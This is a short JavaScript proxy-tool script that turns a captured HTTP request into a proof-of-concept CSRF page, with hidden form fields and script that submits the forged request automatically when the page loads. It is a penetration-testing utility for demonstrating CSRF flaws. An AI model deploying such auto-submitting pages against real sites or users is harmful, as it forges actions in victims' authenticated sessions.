// Generate simple PoC CSRF auto-submit full-URL encoding
// @author : Timothée Ruffenach
// Version 1.0

// Targeted scripts can only be invoked by you, the user, e.g. via a right-click option on the Sites or History tabs

/**
 * A function which will be invoked against a specific "targeted" message.
 *
 * @param msg - the HTTP message being acted upon. This is an HttpMessage object.
 */
function invokeWith(msg) {
	// create fianl result
	var result = ""
	result +=	"<html>\n";
	result += 	"  <body>\n";
	result +=	"    <script>history.pushState('', '', '"+"\/"+"')</script>\n" // change push path if needed

	// check POST of GET
	var methode = msg.getRequestHeader().getMethod()
	
	

	// search list.
	var body = msg.getRequestBody().toString(); // Get data body

	if(methode == "POST") 
	{
		result +=	"    <form action=\"" +msg.getRequestHeader().getURI().toString()+ "\" "+"method=\"" +methode+ "\">\n"
		// sereparate line with caractere &
		lines = body.split('&')

		for( line of lines)
		{
			
			indexEgal = line.indexOf('=');
			if(indexEgal !== -1)
			{
				key = line.substring(0, indexEgal);
				value = decodeURIComponent(line.substring(indexEgal + 1));
				value = encodeSpecialCharactersToHTML(value)
				result += "        <input type=\"hidden\" name=\"" +key+"\" value=\"" +value+ "\"/>\n"
			}
		}
		result += "        <input type=\"submit\" value=\"Submit request\"/>\n"
	}
	else if(methode == "GET")
	{
		uri = msg.getRequestHeader().getURI().toString()
		uri = uri.split('?')
		result +=	"    <form action=\"" +uri[0]+ "\">\n"
		
		uri=msg.getRequestHeader().getURI().toString()
		data = uri.split('?')
		data = data[1]
		
		lines = data.split('&')

		for( line of lines)
		{
			
			indexEgal = line.indexOf('=');
			if(indexEgal !== -1)
			{
				key = line.substring(0, indexEgal);
				value = decodeURIComponent(line.substring(indexEgal + 1));
				value = decodeURIComponent(value)
				value = encodeSpecialCharactersToHTML(value)
				result += "        <input type=\"hidden\" name=\"" +key+"\" value=\"" +value+ "\"/>\n"
			}
		}
		result += "        <input type=\"submit\" value=\"Submit request\"/>\n"
	}
	// close tag
	result +=	"    </form>\n"
	result +=	"    <script>document.forms[0].submit();</script>\n" // add auto submit
	result +=	"  </body>\n"
	result +=	"</html>\n"
	print(result)
}

// encode specials character
function encodeSpecialCharactersToHTML(text) {
	const htmlSpecialCharacters = {
		'&': '&#38;',
		'<': '&#60;',
		'>': '&#62;',
		'"': '&#34;',
		'\'': '&#39;',
		'`': '&#96;',
		'=': '&#61;',
		'/': '&#47;',
		'-': '&#45;',
		'_': '&#95;',
		':': '&#58;',
		';': '&#59;',
		',': '&#44;',
		'.': '&#46;',
		'?': '&#63;',
		'!': '&#33;',
		'@': '&#64;',
		'$': '&#36;',
		'%': '&#37;',
		'#': '&#35;',
		'(': '&#40;',
		')': '&#41;',
		'[': '&#91;',
		']': '&#93;',
		'{': '&#123;',
		'}': '&#125;',
		'+': '&#43;',
		'|': '&#124;',
		'\\': '&#92;',
		'~': '&#126;',
		'^': '&#94;',
		'€': '&#8364;',
		'£': '&#163;',
		'¥': '&#165;',
		'©': '&#169;',
		'®': '&#174;',
		'™': '&#8482;',
		'×': '&#215;',
		'÷': '&#247;',
	};

	let encodedText = '';

	for (const char of text) {
	  if (char in htmlSpecialCharacters) {
		encodedText += htmlSpecialCharacters[char];
	  } else {
		encodedText += char;
	  }
	}
  
	return encodedText;
  }